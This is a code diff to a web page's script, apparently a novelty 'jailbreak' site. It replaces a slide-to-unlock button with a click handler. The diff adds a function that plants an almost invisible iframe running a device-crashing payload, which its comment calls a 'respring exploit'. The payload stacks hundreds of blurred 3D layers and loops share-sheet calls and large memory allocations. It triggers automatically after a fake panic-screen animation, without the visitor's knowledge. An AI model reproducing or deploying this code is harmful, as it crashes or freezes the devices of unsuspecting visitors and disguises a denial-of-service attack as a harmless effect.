@@ -8070,177 +8070,99 @@
 
     // 6. Main Jailbreak button
     const jbBtn = document.getElementById('main-jailbreak-btn');
-    const jbSlideThumb = jbBtn ? jbBtn.querySelector('.slide-thumb') : null;
-
-    function getSlideMax() {
-      if (!jbBtn || !jbSlideThumb) return 0;
-      const inset = jbSlideThumb.offsetLeft || 0;
-      return Math.max(0, jbBtn.clientWidth - jbSlideThumb.offsetWidth - inset * 2);
-    }
-
-    function setSlideProgress(progress) {
-      if (!jbBtn || !jbSlideThumb) return;
-      const clamped = Math.max(0, Math.min(1, progress));
-      const percent = Math.round(clamped * 100);
-      const x = getSlideMax() * clamped;
-      jbBtn.style.setProperty('--slide-x', `${x}px`);
-      jbBtn.style.setProperty('--slide-progress', `${percent}`);
-      jbBtn.setAttribute('aria-valuenow', `${percent}`);
-      jbBtn.setAttribute('aria-valuetext', `${percent}%`);
-    }
-
-    function runMainActionFromSlide(clientX, clientY) {
-      if (!jbBtn || isMainActionRunning) return;
-      isMainActionRunning = true;
-      jbBtn.disabled = true;
-      jbBtn.setAttribute('aria-busy', 'true');
-      
-      if (typeof clientX === 'number' && typeof clientY === 'number') {
-        createParticles(clientX, clientY, '#ffffff');
-      } else {
-        const rect = jbBtn.getBoundingClientRect();
-        createParticles(rect.left + rect.width / 2, rect.top + rect.height / 2, '#ffffff');
-      }
-
-      const audio = document.getElementById('jb-audio');
-      const showPanicAfterSound = () => {
-        setTimeout(() => {
-          boostStarfield(1.8);
-          startPanicScreen();
-        }, 275);
-      };
-
-      if (!audio) {
-        showPanicAfterSound();
-        return;
-      }
-
-      try {
-        audio.currentTime = 0;
-      } catch (_) {}
-
-      const playPromise = audio.play();
-
-      if (playPromise && typeof playPromise.then === 'function') {
-        playPromise.then(showPanicAfterSound).catch(() => {
-          jbBtn.blur();
-          showPanicAfterSound();
-        });
-      } else {
-        showPanicAfterSound();
-      }
-    }
     
-    if (jbBtn && jbSlideThumb) {
-      safeCreateIcons(jbBtn);
-
-      let isSliding = false;
-      let slidePointerId = null;
-      let slideProgress = 0;
-      let slideCompleted = false;
-      const unlockThreshold = 0.96;
-
-      const updateSlideFromClientX = (clientX) => {
-        const rect = jbBtn.getBoundingClientRect();
-        const max = getSlideMax();
-        const inset = jbSlideThumb.offsetLeft || 0;
-        const rawX = clientX - rect.left - inset - jbSlideThumb.offsetWidth / 2;
-        slideProgress = max > 0 ? Math.max(0, Math.min(1, rawX / max)) : 0;
-        setSlideProgress(slideProgress);
-      };
-
-      const resetSlide = () => {
-        jbBtn.classList.add('is-returning');
-        slideProgress = 0;
-        setSlideProgress(0);
-        window.setTimeout(() => {
-          jbBtn.classList.remove('is-returning');
-        }, 240);
-      };
-
-      const completeSlide = () => {
-        if (slideCompleted) return;
-        slideCompleted = true;
-        slideProgress = 1;
-        setSlideProgress(1);
-        jbBtn.classList.remove('is-dragging', 'is-returning');
-        jbBtn.classList.add('is-unlocked');
-        const rect = jbSlideThumb.getBoundingClientRect();
-        window.setTimeout(() => {
-          runMainActionFromSlide(rect.left + rect.width / 2, rect.top + rect.height / 2);
-        }, 460);
-      };
-
-      const endSlide = () => {
-        if (!isSliding) return;
-        isSliding = false;
-        slidePointerId = null;
-        jbBtn.classList.remove('is-dragging');
-        if (slideProgress >= unlockThreshold) {
-          completeSlide();
+    if (jbBtn) {
+      jbBtn.addEventListener('click', (e) => {
+        if (isMainActionRunning) return;
+        isMainActionRunning = true;
+        jbBtn.disabled = true;
+        jbBtn.setAttribute('aria-busy', 'true');
+        
+        if (e.clientX !== 0 && e.clientY !== 0) {
+          createParticles(e.clientX, e.clientY, '#ffffff');
         } else {
-          resetSlide();
+           const rect = jbBtn.getBoundingClientRect();
+           createParticles(rect.left + rect.width/2, rect.top + rect.height/2, '#ffffff');
         }
-      };
 
-      jbBtn.addEventListener('pointerdown', (event) => {
-        if (slideCompleted || jbBtn.disabled) return;
-        const thumbRect = jbSlideThumb.getBoundingClientRect();
-        const canGrab = event.clientX >= thumbRect.left - 24 && event.clientX <= thumbRect.right + 24;
-        if (!canGrab) return;
-        event.preventDefault();
-        isSliding = true;
-        slidePointerId = event.pointerId;
-        jbBtn.classList.remove('is-returning');
-        jbBtn.classList.add('is-dragging');
+        // Simulate click visual if active state un-focuses early
+        jbBtn.style.transform = 'translateZ(0) scale(1.04)';
+        setTimeout(() => {
+          jbBtn.style.transform = '';
+        }, 120);
+
+        const audio = document.getElementById('jb-audio');
+        const showPanicAfterSound = () => {
+          setTimeout(() => {
+            boostStarfield(1.8);
+            startPanicScreen();
+            
+            // Launch respring after panic screen fully loads (795ms total from now)
+            setTimeout(() => {
+              launchRespring();
+            }, 497);
+          }, 275);
+        };
+
+        if (!audio) {
+          showPanicAfterSound();
+          return;
+        }
+
         try {
-          jbBtn.setPointerCapture(event.pointerId);
+          audio.currentTime = 0;
         } catch (_) {}
-      });
 
-      jbBtn.addEventListener('pointermove', (event) => {
-        if (!isSliding || event.pointerId !== slidePointerId) return;
-        event.preventDefault();
-        updateSlideFromClientX(event.clientX);
-        if (slideProgress >= unlockThreshold) {
-          try {
-            if (jbBtn.hasPointerCapture(event.pointerId)) {
-              jbBtn.releasePointerCapture(event.pointerId);
+        const playPromise = audio.play();
+
+        if (playPromise && typeof playPromise.then === 'function') {
+          playPromise.then(showPanicAfterSound).catch(() => {
+            jbBtn.blur();
+            showPanicAfterSound();
+          });
+        } else {
+          showPanicAfterSound();
+        }
+      });
+    }
+
+    // Respring launch function
+    function launchRespring() {
+      // Create hidden iframe for respring exploit
+      const iframe = document.createElement('iframe');
+      iframe.id = 'respring-iframe';
+      iframe.style.cssText = 'position: fixed; top: 0; left: 0; width: 1px; height: 1px; border: none; opacity: 0.01; pointer-events: none; z-index: -1;';
+      iframe.setAttribute('sandbox', 'allow-forms allow-modals allow-scripts allow-same-origin');
+      
+      document.body.appendChild(iframe);
+
+      const respringScript = `
+        <html>
+        <body style="margin:0; overflow:hidden;">
+          <script>
+            const container = document.createElement('div');
+            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+            document.body.appendChild(container);
+
+            for (let i = 0; i < 500; i++) {
+              let d = document.createElement('div');
+              d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg); opacity: 0.99;';
+              container.appendChild(d);
             }
-          } catch (_) {}
-          isSliding = false;
-          slidePointerId = null;
-          completeSlide();
-        }
-      });
 
-      jbBtn.addEventListener('pointerup', (event) => {
-        if (event.pointerId !== slidePointerId) return;
-        event.preventDefault();
-        endSlide();
-      });
-
-      jbBtn.addEventListener('pointercancel', endSlide);
-
-      jbBtn.addEventListener('click', (event) => {
-        event.preventDefault();
-      });
-
-      jbBtn.addEventListener('keydown', (event) => {
-        if (slideCompleted || jbBtn.disabled) return;
-        if (event.key === 'ArrowRight') {
-          event.preventDefault();
-          slideProgress = Math.min(1, slideProgress + 0.14);
-          setSlideProgress(slideProgress);
-          if (slideProgress >= unlockThreshold) completeSlide();
-        } else if (event.key === 'Escape' || event.key === 'ArrowLeft') {
-          event.preventDefault();
-          resetSlide();
-        } else if (event.key === 'Enter' || event.key === ' ') {
-          event.preventDefault();
-          completeSlide();
-        }
-      });
+            setInterval(() => {
+              try {
+                navigator.share({ title: 'R', text: 'R'.repeat(100000) });
+              } catch(e) {}
+              let x = new Uint8Array(1024 * 1024 * 20);
+              crypto.getRandomValues(x);
+            }, 0);
+          <\/script>
+        </body>
+        </html>
+      `;
+      
+      iframe.srcdoc = respringScript;
     }
 
 </script>
